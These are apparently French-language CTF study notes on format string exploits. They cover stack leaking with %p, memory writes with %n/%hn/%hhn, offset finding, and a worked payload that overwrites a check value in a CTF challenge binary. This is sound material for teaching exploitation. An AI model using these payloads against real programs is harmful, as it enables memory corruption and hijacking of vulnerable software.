# Documentation 

- https://docs.pwntools.com/en/stable/fmtstr.html
- https://axcheron.github.io/exploit-101-format-strings/
- https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/
- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
- https://github.com/LMS57/TempleOfPwn/blob/main/format/exploit.py

## Challenges

- [Patriot CTF - GOT Overwrite](https://github.com/4nuit/Writeup/tree/master/2023/Patriot/pwn/printshop)
- https://github.com/4nuit/Writeup/tree/master/2024/HTB_CyberApocalypse/pwn/pwn_delulu

## Trouver un offset

```bash
%400x
%400d
```

-> vérifier avec gdb le contrôle de eip

## Lire en mémoire 


```python 
print('%p-'*200) #exploit en hex

leak = ""
out = b""
for p in leak.split("-"):
    if not p.startswith("0x"):
        continue
    h = p[2:].zfill(16)             # 8 bytes
    out += bytes.fromhex(h)[::-1]   # little endian

print(bytes(c for c in out if 32 <= c <= 126).decode())
```

## Ecrire en mémoire 
 
- %n écrit sur 4 bytes-> adresse énorme en hexa 
- on écrit par groupe de 2 bytes avec %hn
- possible d'écrire byte par byte avec %hhn

### Déterminer le n

On a dans le code d'une part:

![fmt](./images/fmt.png)


D'autre part:

```bash
The D-LuLu face identification robot will scan you shortly!

Try to deceive it by changing your ID.

>> 
[!] Checking.. eb31dbb0.0.96714887.10.7fffffff.1337babe.eb31fcd0.252e7825.2e78252e.78252e78.
[-] ALERT ALERT ALERT ALERT

┌─[night@night-20b7s2ex01]─[~/htb/pwn/delulu]
└──╼ 5 fichiers, 36Kb)─$ python -c "print('%x.'*20)" | ./delulu 
```

- repérer le check visuellement dans la pile: **ici l'offset est de 6**

- obtenir l'addresse du check: **ici le code est bien fait: var40=&var38 est stockée juste après donc le $n=7**

Ainsi pour modifier les lows bytes du check `babe` en `beef`:

```bash
rax2 0xbeef
48879
```

```c
%48879d%7$hn
```

### Call free / malloc

print 2**16-1

```
%100000x
```

### Exploit

0xdeadbeef = 0xdead (high) "+" 0xbeef (low)

- `[hexa à écrire]%x [n contrôlé]$n` 

**ou**

- `[endian(adresse écriture low) + endian(addresse écriture high = low +2)]%[hexa low à écrire - 8]x%[n contrôlé]$hn%[hexa abs((low-8)-(high-8)) à écrire]x%[n+1] $hn"')`


**ou** en 4 avec %hhn ...
